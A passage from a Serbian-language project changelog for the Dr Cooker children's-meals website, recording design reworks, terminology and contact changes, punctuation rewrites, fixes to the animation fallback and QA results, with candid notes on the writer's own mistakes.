na njima treba da stoji. Naslov sekcije stoji izvan markera, pa ga ponovno
generisanje ne briše.

### Logo — otvorena stavka

Dostavljeni fajl je 260×64 px. U zaglavlju se prikazuje na 179×44, dakle bez
rezerve za ekrane sa dvostrukom gustinom — na njima je blago mek. Traži od
klijenta izvorni fajl (SVG, AI, EPS ili PNG od bar 1000 px širine); zamena je
jedan fajl, bez promene koda.

U podnožju logo stoji na svetloj ploči (`.brand--light`). Razlog: crveno/plavi
logo na tamnoj podlozi podnožja pada na ~3.3:1, ispod praga čitljivosti. Ploča
je izabrana umesto prekrašavanja logotipa jer klijent traži da logo ostane
netaknut.

### QA posle v2

| Provera | Rezultat |
|---|---|
| `python tools/audit.py` | 0 grešaka, 0 upozorenja, 17 stranica |
| Responsive: 17 stranica × 10 širina (320→1920) | 170/170 bez horizontalnog skrola i preliva |
| Svaki `src`/`href`/`srcset`/`url()` protiv servera | 35 resursa, svi 200 |
| Hijerarhija naslova | 17 stranica, tačno jedan `h1`, bez preskočenih nivoa |
| Ponašanje kad je kartica skrivena | `js-on` izostaje, sadržaj ostaje vidljiv (`opacity: 1`) — tako i treba |
| Ponašanje kad je kartica vidljiva | `js-on` postavljen, svih 19 `[data-reveal]` otkriveno |
| Nova opcija `obroci-boravak` protiv žive adrese | **Odbijena** — čeka ponovno objavljivanje (gore) |

Popravljeno tokom ovog kruga:

| Nalaz | Popravka |
|---|---|
| Zaglavlje tabele nedeljnog menija bilo 11px u pojasu 900–1199 px | Podignuto na 12px; tabela je `table-layout: fixed`, pa se prelomi umesto da se smanjuje. Provereno na 900/960/1024/1100/1199/1200 — bez preliva |
| Sekcija sa fotografijama u galeriji nije imala naslov | Dodato zaglavlje sekcije (`h2` + uvod), izvan `#region` markera |
| Forma nije nudila boravke, iako su jedna od tri publike | Dodata opcija `obroci-boravak` u formu i u `Code.gs` |

---

## 11. Šta NIJE urađeno i zašto

| Stvar | Zašto |
|---|---|
| Učitavanje zaglavlja JavaScriptom | Ne radi kada se stranica otvori dvoklikom (`file://` blokira `fetch`), pomera layout i sakriva navigaciju od pretraživača. Umesto toga: partial fajlovi + `tools/sync-partials.mjs`. |
| Jelovnik iz JSON-a, renderovan JavaScriptom | Isti razlog, plus gubitak SEO-a na najvrednijem sadržaju. Tabele su sada običan HTML. Menjaju se direktno u `pages/nedeljni-jelovnik.html`. |
| `responsive.css` kao zaseban fajl | Media query stoji uz pravilo koje menja, pa se jedna komponenta menja na jednom mestu umesto u dva fajla. |
| Minifikacija CSS-a i JS-a | Zahtevala bi build korak. Razlika je ~25 KB pre gzip-a; hosting gzip-uje sam. |
| Cenovnik, blog | Nema sadržaja. |
| ~~Galerija~~ | Napravljena u v2 na zahtev klijenta — vidi sekciju 10d. Fotografije se i dalje čekaju. |

---

## 12. Sledeći koraci

1. **Ponovo objavi Apps Script** — bez toga opcija „boravak za decu" ne radi.
   Koraci su u sekciji 10d.
2. **Pogledaj sajt** — dvoklik na `start.cmd`.
3. Pošalji test upit za svaku od tri opcije obroka i proveri Sheet i oba mejla.
4. Pripremi za četvrtak: predlog teksta po stranicama, pitanje o izvornom
   logotipu, pitanje da li **Snabdevanje** ostaje.
5. Traži fotografije kuhinje za galeriju — sada postoji stranica koja ih čeka.
6. Deploy po [`DEPLOY.md`](DEPLOY.md), pa Search Console i provera preusmerenja.

---

## 10e. v3 — premium rework

Zadatak nije bio „dodaj animacije" nego: analiziraj sajt, nađi zašto deluje
korektno umesto autorski, i promeni to.

### Kako je analiza rađena

Dvanaest nezavisnih uglova (art direction, tipografija, layout, boja, postojeći
motion, scroll-naracija, mikrointerakcije, navigacija, UX/konverzija,
performanse, pristupačnost, tehnički temelj), svaki kroz adversarijalni filter
koji je ponovo otvarao svaki citirani fajl.

Filter je izbacio **86 nalaza i 127 netačnih citata**. To je razlog zašto
druga faza postoji: prvi prolaz je bio ubedljiv i trećinom netačan.

### Dijagnoza

Sajt je referentni dokument koji je stilizovan, a ne stranica koja je
komponovana — i stilizovan je izuzetno dobro. Zakon boje sa QA testom uz njega,
kontrasti izračunati i zapisani, print stylesheet nišanjen na stvaran ritual
kupovine, taksonomija grešaka koja odbija da tvrdi ono što ne zna.

Jedan strukturni razlog zašto to ipak deluje obično:

> **Sajt ima jedan ritam i jedan nivo glasa, primenjen uniformno, pa ništa
> nikad ne sme da padne jače od svega ostalog.**

Mereno: `--space-section` daje 89.6px na svakoj sekciji na svih 17 stranica.
Token koji bi dao više vazduha, `--space-11` (192px), imao je **nula upotreba
u 5958 linija**. `.display-2` je 64px, upotrebljen 90 puta, do deset puta na
jednoj stranici, bez ijednog koraka između njega i 36px. Naslovna je 8 ekrana,
a svaka sekcija je bila između 0.4 i 1.2 ekrana.

### Centralna ideja

**Dokaz ide u izložbenoj veličini; glas firme se skuplja u potpise oko njega.**

Kupac nije potrošač koji bira dobavljača — direktorka sastavlja odbranu koju
pokazuje upravnom odboru, roditelju ili inspekciji. Njena valuta su gramature,
jelovnik cele nedelje, nutritivna matrica i ime zavoda koji uzima briseve.
Hijerarhija je bila tačno obrnuta: tvrdnje na 64px, dokaz na 13px labelama.

Ideja je i jedina koja **jača** bez fotografija: kupljena stock fotografija
oslabila bi stranicu sa pravim imenima jela, a konkurent sa foto-bibliotekom
ne može da kopira objavljenu nutritivnu matricu.

### Motion arhitektura — native-only, bez GSAP-a i bez Lenisa

Odluka nije o bajtovima nego o tome da biblioteka **poništava mrežu koja čuva
sadržaj**:

- `revealEverything()` dodaje samo KLASE. GSAP-ov `from()` upisuje **inline**
  `opacity: 0`, a inline stil pobeđuje svaku klasu — pa bi zaglavljena
  vremenska linija dala tačno onaj prazan naslov na koji se klijent već žalio.
- `tools/audit.py` parsira samo `css/motion.css` i ne vidi nijedan inline stil.
  Jedina mašinski proverena garancija u projektu prestala bi da čuva na dan
  kada biblioteka uđe.
- Lenis zamenjuje nativni skrol i poništava `scroll-padding-top`, koji drži
  17 skip linkova i sidra van sticky zaglavlja — regresija WCAG 2.4.1 — i lomi
  Ctrl+F na sajtu gde je nalaženje broja u tabeli gramatura sam posao kupca.

Sve novo kretanje živi u postojećim `js/motion.js` i `css/motion.css`.
Dodato trećih strana: **0 KB**.

### Šta je izgrađeno

| | |
|---|---|
| `--fs-section-head` | novi korak, 28→44px. `.display-2` je sada glas sekcije. |
| `.display-2--loud` | pun 64px glas, **jedan po stranici** — naslov koji nosi argument. Raspoređen po svih 17 stranica. |
| `.section--air` | oživljen `--space-11` (192px). Najviše tri po stranici. |
| `.izlozak` | komponenta izloška: jedina sme da izađe iz shell-a i da nadglasa naslov iznad sebe. |
| Izložak 01 na naslovnoj | gramature po uzrastu, sa **razlikom** kao trećom kolonom na punoj display visini. Aritmetika koju niko ne objavljuje. |
| `.slot-spec` | 22 prazna okvira za fotografije postali specimen kartice sa proverljivom činjenicom. |
| Linija izloška | `animation-timeline: view()`, scrubovana. Statično stanje je **povučena** linija — browser bez podrške vidi završeno, nikad početno. |

### Šta je popravljeno

| Nalaz | Dokaz |
|---|---|
| **Nedeljni meni se renderovao DVAPUT** na desktopu | 4897px duplikata na stranici od 13112px — 37%. Kaskada: `@media` blok na components.css:944 sakriva kartice, bazno pravilo 71 liniju niže ih vraća. Medija upit ne nosi specifičnost, samo redosled. |
| **3-sekundna mreža je gasila ceo scroll sistem** | `revealEverything()` nije imao filter po viewportu. Posetilac koji čita heroj duže od 3s dalje je skrolovao kroz stranicu na kojoj je svaka od 280 kukica već odigrala u prazno. |
| Nutritivna matrica se nije štampala | `grep -c nutri css/print.css` = 0. Baš dokument zbog koga print.css postoji. |
| Naslovi tabela nevidljivi na papiru | `caption.visually-hidden` → dokument bez naslova pred upravnim odborom. |
| Brojači: HTML šalje `~1000`, JS završava `~1.000` | Reduced-motion korisnik vidi drugi broj. Odbrojavanje obrisano — broj koji stoji čita se kao činjenica, onaj koji se penje kao pitch deck. −49 linija JS-a. |
| Galerija tvrdila da fotografije postoje | Šest puta, uključujući `og:description` koji Viber renderuje u pregledu linka. Folder prazan. |
| `archivo-600` kretao 62ms posle ostalih | Nosi eyebrow iznad h1 i CTA dugme. Posle preload-a: **13ms**. |
| Mrtav CSS sloj | 43 selektora (`.page-za-kompanije`, `.pub`, `.link .arr`). |
| 18 komentara za fotografa u HTML-u | Slali se svakom posetiocu. Žive u `FOTO-BRIEF.md`. |

### Šta je odbijeno, i zašto

Brief je tražio WebGL, custom kursor, horizontalni skrol, image distortion i
velocity efekte. Nijedan nije ušao:

- **WebGL / image distortion** — nema nijedne slike osim logotipa koji se ne
  sme dirati. Tehnika pretpostavlja fotografiju koje nema.
- **Custom kursor** — samo desktop sa preciznim pokazivačem, a kupac je često
  na telefonu. Takmiči se sa fokus prstenom koji je ovde pažljivo izmeren.
- **Horizontalni skrol** — `overflow-x` van `.table-scroll` je **greška** u
  `tools/audit.py:309`. Transform varijanta krije sadržaj od Ctrl+F.
- **Velocity efekti** — čitaju se kao nestabilnost, što je tačna suprotnost
  jedinog kvaliteta koji se prodaje.
- **Page transitions** — prihvaćeni, ali **već postoje**:
  `@view-transition { navigation: auto }` u motion.css:24, bez ijedne linije JS-a.
- **Dark mode** — odbijen i u pisanoj formi u `css/base.css:29`.

### Šta ostaje

- OG slika (`assets/images/og-default.png`) i dalje piše „Dr COOKER" i
  „i kompanije" — oboje klijent traži da se promeni. **Blokirano**: generator
  traži `sharp`, nije instaliran, nema `package.json`.
- Dve preostale stranice galerije bez pokrića za specimen karticu.
- Izlošci na ostalim stranicama — naslovna ima svoj, ostale još ne.

---

## 10f. v4 — repozicioniranje po brifu klijenta (29.09.2026)

Sajt prestaje da se predstavlja kao ketering i postaje **obroci za decu**.

### Terminologija — 246 pojava, sve uklonjene

| Bilo | Sada | Pojava |
|---|---|---|
| kuhinja / centralna kuhinja | **proizvodnja** | 110 |
| gramature | **normativi** | 64 |
| ketering | **obroci za decu** | 47 |
| komercijala | uklonjeno, jedan direktan kontakt | 9 |
| Nedeljni meni | **Nedeljni jelovnik** | 26 |
| Sinko kao naslov | **Online supermarket** | 26 |

Zamena nije bila mehanička: „tim u kuhinji" postaje „tim u proizvodnji", ali
`Kuhinja ustanove` u Sinko katalogu postaje **Napitci, higijena i domaćinstvo**
— jer ta kategorija sadrži kafu, vodu, sredstva za pranje i papirnu
konfekciju, pa staro ime nije bilo samo zabranjeno nego i netačno.

Preimenovane su i stranice, sa svim referencama:

```
pages/gramature.html      -> pages/normativi.html         70 linkova + 39 klasa
pages/nedeljni-meni.html  -> pages/nedeljni-jelovnik.html 76 linkova + 45 klasa
```

Preostale dve pojave u kodu su komentari koji **objašnjavaju zašto je pojam
uklonjen** — ostavljeni namerno, da naredni čitalac ne vrati staro.

### Telefon — 101 pojava komercijalinog broja

`060 0440458` više ne postoji. Uklonjen je iz: `js/config.js`, `Code.gs`,
partiala podnožja, strukturiranih podataka (ceo `contactPoint` objekat),
meta opisa, CTA dugmadi na 11 stranica, mejl šablona i generatora mejlova.

Uz jedan broj i labela „Direktor" postaje šum, pa je i ona uklonjena —
posetilac zove firmu, ne funkciju. Prikaz je `064 110 1521`, a `tel:` href
ostaje `+381641101521` jer taj oblik radi i iz inostranstva.

### Navigacija

Regenerisana iz **jedne** definicije (`hdr__list` i `mnav__list` su se ranije
održavale ručno i mogle su se raziđi):

```
Obroci za vrtiće i škole
Nedeljni jelovnik  ▸ Jelovnik · Normativi
Online supermarket ▸ Asortiman za ustanove
Kako radimo        ▸ Nutricionista · Bezbednost hrane · Dostava
Galerija · O nama · Kontakt
```

### Naslovna

| Sekcija | Šta nosi |
|---|---|
| **Heroj** | H1 „Obroci za decu", traka `Doručak · Ručak · Užina · Voće`, tri benefita, desno kompozicija oko klijentovog logotipa + crvena značka za besplatan prvi mesec |
| **Brojevi** | 1.500 obroka dnevno · 120+ posebnih obroka · besplatan individualni jelovnik |
| **Posebni obroci** | jedini glasan naslov na stranici — klijentova glavna prednost |
| **Ovako izgleda jedan dan** | primer ponedeljka, pet obroka imenom |
| **Online supermarket** | 7.000+ artikala, četiri pogodnosti, izlaz na sinko.rs |
| **Proizvodnja** | Vojvode Prijezde 17 — o pogonu, ne o tome koji se obrok tu sprema |

### Dve odluke koje odstupaju od doslovnog brifa

**1. Besplatna dostava je kvalifikovana.** Brief kaže „besplatna dostava" bez
uslova. Proveren izvor (`docs/SOURCE-BRIEF.md:403`, čitano sa sinko.rs) kaže
da je besplatna **preko praga porudžbine** — 4.999 RSD do 3 km, 7.999 RSD od
3 do 10 km. Bezuslovna tvrdnja na sajtu je obećanje koje prodavnica ne daje,
pa stoji: *„Besplatna dostava u zoni do 10 km, preko praga porudžbine."*

**2. Link ka prodavnici ide na `https://www.sinko.rs/`, ne na `https://sinko.rs/`.**
Mereno: goli domen vraća `301 → http://www.sinko.rs/`, dakle **skida korisnika
sa HTTPS-a**. `www` oblik vraća 200 direktno.

### Šta je uklonjeno iz strukturiranih podataka

`legalName: "Dr Cooker ketering servis"` je **obrisan**, ne prepravljen.
`schema.org/legalName` tvrdi registrovani naziv firme; taj naziv nije potvrđen,
a nosio je zabranjenu reč. Bolje izostaviti tvrdnju nego je zameniti pogađanjem.

### Provereno

| | |
|---|---|
| `tools/audit.py` | 0 grešaka, 0 upozorenja, 17 stranica |
| Responsive 17 × 8 širina (320→1920) | 136/136 bez preliva i horizontalnog skrola |
| Interni linkovi | 844 provereno, 0 pokvarenih |
| Resursi protiv servera | 36, svi 200 |
| Hijerarhija naslova | 17 stranica, jedan `h1`, jedan glasan `h2` po stranici |
| Forma protiv mock backenda | jedan panel, referentni broj, 0 grešaka |
| `tel:` na stranicama | samo `+381641101521` (izuzev Sinkovih brojeva za dogovor o isporuci) |
| Zaostala stara terminologija | 0 |

### Ostaje

- **OG slika** (`assets/images/og-default.png`) i dalje nosi stari tekst.
  Generator `tools/build-icons.mjs` je **ispravljen**, ali ne može da se
  pokrene: traži `sharp`, koji nije instaliran i nema `package.json`.
- Klijent (Dule) piše finalni tekst za „Obroci za vrtiće i škole" — struktura
  je spremna, tekst nije izmišljan.
- Dve kartice u galeriji bez pokrića za činjenicu (vidi 10e).

### 10f.1 Crta uklonjena iz celog teksta

Klijent ne želi crtu „—" nigde u tekstu. To nije zamena znaka nego prepisivanje
interpunkcije: brisanje crte ostavlja polomljenu rečenicu, a zamena običnom
crticom je ista greška manjim znakom.

Primenjeno pravilo po funkciji crte u rečenici:

| Šta crta radi | Zamena | Primer |
|---|---|---|
| nabraja ili precizira | dvotačka | „22 kategorije: hrana, higijena, papir" |
| dodaje, nastavlja misao | zarez | „na dnevnom nivou, bez lagerovanja" |
| uvodi novu tvrdnju | tačka | „…Gradski zavod. Periodično uzima briseve" |
| umetnuta misao | dva zareza | |

Obuhvaćeno je i ono što obične provere promaše:

- **atributi** `alt`, `aria-label`, `title`, `placeholder`, `data-mapa-title` —
  regex koji skida HTML tagove briše i njihov sadržaj, pa crta u njima ostaje
  nevidljiva za merenje, a čitač ekrana je pročita
- **URL-enkodirana crta** `%E2%80%94` u `mailto:` predmetu (tu se krila i stara
  verzija imena, `Dr%20COOKER`)
- **predmet mejla** koji stiže klijentu
- **`site.webmanifest`**, `robots.txt`, `_redirects` i generatori koji ih prave
- **polusloženica** `nutricionista–dijetetičar`: en dash zamenjen crticom, što
  je u srpskom i ispravno za polusloženicu

Naslovi stranica su svedeni na jedan obrazac: `Tema: pojašnjenje | Dr Cooker`.

**Provera:** `innerText` svih 17 stranica, iscrtanih u browseru na 8 širina —
**0 crta**. Merena je iscrtana stranica, ne izvorni kod.

**Šta je nezavisna provera uhvatila posle prvog prolaza.** Brojanje crta je
pokazalo nulu, ali nula crta ne znači ispravan tekst. Provera je našla:

| Nalaz | Popravka |
|---|---|
| Crta zamenjena uspravnom crtom `\|` u zaglavlju tabele i u naslovu sekcije | „Kuvani obroci (Dr Cooker)", „Kontrolu sprovode dve strane:" — uspravna crta u tekućem tekstu je ista greška drugim znakom |
| `<li>Dostava</li>` — rečenica odsečena umesto prepisana | Vraćeno „Dostava istog dana za porudžbine do 12 časova" (tvrdnja već stoji na istoj stranici i na Sinko stranici) |
| Hero lead rasečen na dve rečenice, pa se uzročna veza pomerila na pogrešnu prethodnicu | Spojeno nazad u jednu rečenicu |
| „Svaki korak ima proveru: i unutrašnju i spoljašnju" | Dvotačka pred korelativom „i… i…" je greška; zamenjena zarezom |
| „Koliko grama nosi svako od ovih jela, objavljeno u celosti" | Particip ostao bez slaganja pošto je crta pala; umetnuta kopula: „objavljeno **je** u celosti" |
| **Opcija u formi** „za privatni vrtić **i** jaslice" | Bila je „vrtić / jaslice", dakle ILI. Veznik „i" sužava opciju na ustanove koje imaju oboje, pa bi ustanova samo sa jaslicama oklevala. Vraćeno na „ili", i usklađeno sa `SERVICE_LABELS` u `Code.gs` i generatoru mejlova |

Poslednji red je bio moja greška, nastala kad sam labele usluga menjao
mehanički, bez čitanja šta razdvojnik „/" znači u toj rečenici.

---

## 10g. Primena 87 primedbi klijenta (02.10.2026)

Vlasnik je prošao sajt stranicu po stranicu i upisao 87 primedbi, uz dva
mejla i dva ažurna nedeljna jelovnika. Ovo je zapis šta je od toga primenjeno,
šta je odbijeno kao netačno, i šta je ostalo da čeka njegovu reč.

### Šta su njegovi dokumenti rešili od starih otvorenih pitanja

Nekoliko stvari koje su do tada bile pretpostavke sada su potvrđene, i to
njegovom rukom:

| Podatak | Bilo na sajtu | Po njegovim dokumentima |
|---|---|---|
| Artikli u supermarketu | 7.000 | **5.000** |
| Pravno ime | nije stajalo | **DR COOKER PREMIUM D.O.O.** |
| Lokacija proizvodnje | Beograd, Voždovac | **Dušanovac, opština Voždovac** |
| Referenca | „skoro 1.000 mališana u 10 objekata" + ime ustanove | **1.500 mališana u 38 objekata**, bez imena |
| Besplatna dostava | preko praga porudžbine | **njihovim kupcima bez praga** |

Ime referentne ustanove je uklonjeno u potpunosti, na njegov izričit zahtev.

### Najozbiljnija ispravka: popravio sam pogrešnu stranu protivrečnosti

Sajt je na šest mesta tvrdio da su **suhomesnate prerađevine u potpunosti
isključene** iz dečjeg jelovnika, a kartica doručka je istovremeno nudila
slaninu, pečenicu i čvarke. U prethodnom prolazu sam tu protivrečnost rešio
tako što sam **uklonio karticu, a ostavio pravilo**.

Pogrešno. Vlasnik: *„Ovo ukini. Ima suhomesnatih proizvoda u jelovniku"*, a
njegovi jelovnici to i pokazuju (`Makarone sa sirom i slaninicom`, `Čorbasto
sočivo sa suvim mesom`). Pravilo je bilo netačna tvrdnja koju sam ja branio.

Uklonjeno sa svih šest mesta, uključujući četiri instance u strukturiranim
podacima, i cela sekcija `#pravila-jelovnika` je obrisana.

**Nauk:** kada se dve tvrdnje na sajtu sudaraju, pitanje nije koja je lepša
nego koja je tačna. Proveriti u izvoru, ne birati po doslednosti teksta.

### Obim

| | |
|---|---|
| Primedbi primenjeno | 87 |
| Stranica menjano | 14 |
| Celih sekcija uklonjeno | 30 |
| Jelovnika ugrađeno iz njegovih Word fajlova | 2, po 5 dana × 4 obroka |
| Novih alata | `tools/build-jelovnik.py`, `tools/provera-copy.py` |

Svaka stranica je išla kroz jednog agenta koji je dobio **samo svoje primedbe,
doslovno kako ih je vlasnik napisao**, bez mog prepričavanja. Agenti koji nisu
razumeli primedbu imali su nalog da ne pogađaju nego da prijave; tako je
nastao `docs/OTVORENO.md`.

### `tools/provera-copy.py`

`audit.py` čuva strukturu, reference i SEO, ali ne i tekst. Novi alat čuva
redakcijska pravila: crte, veliko `I` kao veznik, jedan glasan naslov po
stranici, saglasnost četiri kopije meta opisa, izbačene termine i jedan
telefon.

Dva pravila su morala da budu ispravljena jer su lagala:

- **`kuhinja` i `ketering`** su prvo bili greška. Oba se legitimno javljaju:
  „Vaša eventualna interna kuhinja" govori o kuhinji **kod klijenta**, a
  „ketering za decu" je napisao sam vlasnik u novom uvodu stranice O nama.
  Prebačeni su u upozorenje, jer traže ljudsko oko a ne pravilo.
- **veliko `I` kao veznik** je dva puta prijavilo rimski broj u „Užina I".
  Prvo zato što je gledalo samo razmake, pa zato što je ispred „I" u „Užina I"
  ionako malo slovo `a`. Razlikovni znak je da li **iza** veznika sledi reč u
  istom tekstualnom čvoru. Spljoštena stranica ne vredi za takva pravila:
  granica elementa postaje razmak, pa se „jogurt" iz jedne ćelije tabele nađe
  neposredno pred „Užina I" iz sledeće. Zato alat gradi dva teksta, jedan
  spljošten za traženje reči i jedan po čvorovima za pravila o susedstvu.

Test je ostao u alatu, `python tools/provera-copy.py --test`, sa oba slučaja
koja su ga obarala.

### Greška u sigurnosnoj mreži za animacije

Provera u browseru je otkrila stranicu na kojoj posetilac proskroluje sve, a
sadržaj se ne pojavi. Merenje je pokazalo zašto: u tom okruženju
`IntersectionObserver` ne isporučuje **ni jedan** poziv, iako specifikacija
nalaže početni poziv za svaku metu. Dakle posmatrač je mrtav, i sve je palo na
sigurnosnu mrežu.

Mreža je imala tri greške, od kojih su dve moje iz prethodnog prolaza:

1. **Čuvar na skrolu je radio posao unutar `requestAnimationFrame`.** Komentar
   iznad mreže kaže da mreža postoji za stranicu koja se nikad ne iscrta, gde
   rAF ne okida nijednom. Zatim sam jedini poziv `mrezaTik()` stavio u rAF.
   Ograničavanje je prebačeno na sat.
2. **Ograničavanje je hvatalo samo prvu ivicu.** Poslednji potez, onaj koji
   zaustavlja stranicu na konačnom mestu, pada unutar intervala i bio bi
   odbačen, pa bi sadržaj tačno tamo gde je posetilac stao ostao nevidljiv.
   Dodata zadnja ivica.
3. **Prolazi na sat su stajali posle 20 sekundi.** U okruženju gde ne rade ni
   posmatrač, ni rAF, ni skrol događaji, taj sat je jedino što otkriva
   sadržaj. Posetilac koji prvi ekran čita duže od dvadeset sekundi dalje ne
   bi video ništa. Ritam sada popušta: sekunda do 20 s, pa pet sekundi, stop
   na ~3 min.

**Kako je izmereno.** Prvo nekoliko merenja je bilo neupotrebljivo jer je
lokalni server dozvoljavao keš, pa je browser servirao **staru** verziju
`motion.js` (21.402 B naspram 23.234 B). Zato su rezultati bili nestabilni i
delovalo je da popravka radi na dve stranice a ne na trećoj. Posle prelaska na
server sa `no-cache`:

| Provera | Rezultat |
|---|---|
| 17 stranica, pun skrol, okruženje bez IO / rAF / skrol događaja | **0 skrivenih** elemenata, 0 neprelomljenih naslova |
| Najgori slučaj: 25 s čitanja prvog ekrana pa skrol | 29 → 20 → **0** |
| Vodoravno prelivanje, 17 stranica × 7 širina (360 do 1440) | 119 mera, **0 prelivanja** |

Okruženje u kome posmatrač ne radi pokazalo se kao najkorisniji test koji sam
imao: to je tačno onaj slučaj zbog koga mreža i postoji, a nijedna provera
zasnovana na ispravnom browseru ga ne bi dotakla.

### Naslovi koji su obećavali obrisano

Posle njegovih brisanja dva naslova u pretraživaču su reklamirali sekcije
kojih više nema. Prepisani su iz teksta koji je ostao, na sva četiri mesta:

- `Nutricionista: jelovnici, normativi i obuke` → `Nutricionista: dečji
  jelovnici po Pravilniku` (normativi i obuke su obrisani)
- `Jelovnik: doručak, ručak i užine` → `Jelovnik: domaća hrana po našoj
  recepturi` (njegova sopstvena rečenica iz novog `h1`)

### Stanje provera

```
python tools/audit.py          17 stranica, 0 grešaka, 0 upozorenja
python tools/provera-copy.py   0 grešaka, 8 upozorenja (sva proverena)
python tools/provera-copy.py --test   0 padova
em/en dash na celom sajtu      0
```

Osam upozorenja su svesno ostavljena: tri su Sinkovi telefoni, četiri su
legitimne pojave reči „kuhinja", jedno je „ketering" iz njegovog teksta.

### Šta nije moglo da se završi

- **Logo Sinko** — traži ga u uvodu stranice supermarketa, u projektu ne
  postoji nijedan Sinko fajl. Putanja se ne izmišlja.
- **Fotografije proizvodnje** — galerija ostaje sa praznim okvirima, što je i
  sam odložio: „sređujemo kada dobijemo fotografije".
- **Spisak 22 kategorije** za stranicu Snabdevanje — traži tabelu koje tamo
  nema.
- **OG slike** — regeneracija traži `sharp`, nije instaliran, nema
  `package.json`.
- **Nema staging adrese**, pa klijent ne može da pregleda sajt u browseru.
  Dokument `docs/Dr-Cooker-revizija.docx` je zato jedini način da komentariše.

### Otvoreno

`docs/OTVORENO.md` i tabela odluka u `docs/Dr-Cooker-revizija.docx` nose 13
stvari koje čekaju njegovu reč. Najvažnije: adresa (jedan podatak ili dva),
„jedina delatnost" naspram dve stranice o snabdevanju, i to što su posle
njegovih brisanja četiri stranice ostale pod 230 reči.

---

## 10h. Četiri zahteva od 05.10.2026, i šta je provera oborila

Klijent je tražio četiri stvari: skloniti promotivnu značku iz heroja,
staviti diskretno dugme ka sinko.rs na njeno mesto, dodati mreže u podnožje i
napraviti popup o zonama isporuke.

### Prilozi nisu nosili nov sadržaj

Tri priložena dokumenta su po hešu bila identična već obrađenima: dokument za
reviziju je isti onaj iz koga je 02.10. izvučeno 87 primedbi (diff po
sekcijama: 87 = 87, nula razlike u oba smera), a oba jelovnika su bajt
identična onima koji već stoje na sajtu.

Zato jedan deo zahteva nije mogao da se izvrši kako je napisan: tražio je da
se sadržaj popupa uzme iz „drugog dokumenta", a takav dokument nije priložen.
Sadržaj nije izmišljen; uzet je iz tabele koja već stoji na sajtu.

### Zahtevi 1 i 2 su bili urađeni, ali neokomitovani

Oba su odrađena 02.10. Formulacija koju traži stajala je reč u reč. Ali
`git log -S` za „supermarket-cta" i za „promotivnog perioda" davao je **nula
komitova**: jedan `git checkout` bi ih obrisao. Prvi potez je bio komit.

### Šta je protivnička provera oborila

Posle implementacije je pušteno pet nezavisnih napada plus presuda koja je
svaki nalaz proveravala u fajlu. Potvrđeno je sedamnaest, od toga dva koja su
značila da zahtev **nije** ispunjen:

| Nalaz | Zašto je bio promašaj |
|---|---|
| Dijalog samo na 1 od 4 stranice koje vode u prodavnicu | Četiri korisnička odlaska, uključujući oba sa početne, prolazila su bez obaveštenja. Zahtev 4 je promašivao baš trenutak zbog kog je tražen |
| Dugme u heroju nije bilo manje nego **najveće** | `inline-size: 100%` ga je činio 2,3× do 3,2× po površini od glavnog CTA, i to na mestu gde je stajala značka koju je nazvao prevarom. Komentar iznad pravila tvrdio je suprotno od onoga što pravilo radi |

Ostali potvrđeni nalazi, svi popravljeni: fokus je bežao iz dijaloga (klik na
običan tekst stavlja fokus na `main`, koji nosi `tabindex="-1"` i predak je
dijaloga, pa ni „prvi" ni „poslednji" nije važilo); tabela u dijalogu je na
telefonu sekla poslednji red i kolonu sa cenom; rečenica je ispustila reč
„besplatna" i ogradu „kako su objavljeni na sinko.rs"; poslednja rečenica je
bila operativno obećanje bez izvora; granica zona se preklapala na tačno 3 km;
okidači su i dalje najavljivali „otvara se u novom prozoru" iako otvaraju
dijalog; prag zaglavlja je bio pogrešan dva puta zaredom.

### Prag zaglavlja: tri pokušaja, i zašto

Zatečeno stanje: desktop zaglavlje se palilo na 66rem (1056px) iako mu red ne
staje. Izmereno na 1100px treba mu 1213px, pa je glavni CTA bio **izguran van
ljuske i neklikabilan** u celom pojasu 1056 do 1219px. Ništa to nije
pokazivalo: `body { overflow-x: clip }` guta skrol traku, pa `scrollX` ostaje
0 i svaka provera koja pita „ima li horizontalnog skrola" prolazi. Raniji
prolaz je prijavio nula prelivanja jer je uzorkovao 1024 i 1280 i nikad
između.

Prvi pokušaj 77rem: natpis se i dalje lomio u dva reda. Drugi 82rem: isto.
Tek merenje u koracima od 10px, sa visinom dugmeta kao signalom (40px je jedan
red, 56px dva), dalo je pravu granicu: **1330px**. Prag je zato 84rem.

Nauk: prag se ne pogađa iz širine sadržaja na jednoj tački, nego se meri po
opsegu, i meri se ono što se lomi, ne ono što se preliva.

### Zatečeno, nije iz ovih zahteva

Traka sa brojevima na tamnoj sekciji početne imala je kontrast **1,10:1** za
tekst i **1,65:1** za broj: tamno mastilo na tamnozelenom. Ceo blok „Koliko
dece hranimo", sa njegovim referentnim brojevima, bio je nečitljiv. Boje su
bile pisane samo za svetlu podlogu.

### Stanje provera

```
python tools/audit.py                 17 stranica, 0 grešaka, 0 upozorenja
python tools/provera-copy.py          0 grešaka, 8 upozorenja
python tools/provera-copy.py --test   0 padova
node tools/sync-partials.mjs          0 ažurirano, 17 bez izmene
```

`sync-partials` sada može da prijavi „bez izmene" jer `.gitattributes`
normalizuje prelome redova. Bez toga je na Windows checkout-u svaka stranica
izgledala izmenjeno i jedina provera koja hvata stranicu menjanu mimo
partiala bila je beskorisna. Uz to: `audit.py` tu proveru **nema**, uprkos
svom docstringu, pa je zaboravljen sync i dalje tiha greška.

### Mereno u browseru

| Provera | Rezultat |
|---|---|
| 73 širine od 320 do 1700px | 0 prelivanja, 0 odsečenih CTA, 0 prelomljenih natpisa |
| 17 stranica × 3 širine | 0 prelivanja, mreže svuda, kontrast svuda ≥ 4,5:1 |
| Dijalog na 10 veličina ekrana | panel u ekranu, obe akcije dohvatljive, meta ≥ 44px |
| Dugme u heroju naspram glavnog CTA | 0,59 do 0,69 površine, na svim širinama |
